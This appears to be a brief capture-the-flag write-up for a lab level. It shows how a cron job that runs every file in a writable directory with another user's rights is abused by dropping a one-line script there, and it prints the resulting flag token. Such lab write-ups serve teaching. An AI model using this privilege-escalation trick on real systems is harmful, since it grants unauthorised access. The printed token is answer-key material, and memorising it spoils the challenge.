when logged in to level05 a message tell us we have a new mail

with the help of the command "find / -name mail 2>/dev/null" we can see a folder "mail" that contains a file "level05"
the file show us a something familary to a cron thing, after took a look at cron jobs with linux, we can understand that is executing every 2 minutes a shell script

*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

cat /usr/sbin/openarenaserver show us a script that execute bash -x for every file in /opt/openarenaserver/*

#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

so if we put a script inside /opt/openarenaserver/ it will be executed with flag05 perms, here is the evalate privilige exploit

echo 'getflag > /tmp/flag.txt' > /opt/openarenaserver/getmyflag.sh

then after waiting less than 2minutes, cat /tmp/flag.txt is showing:

Check flag.Here is your token : viuaaale9huek52boumoomioc
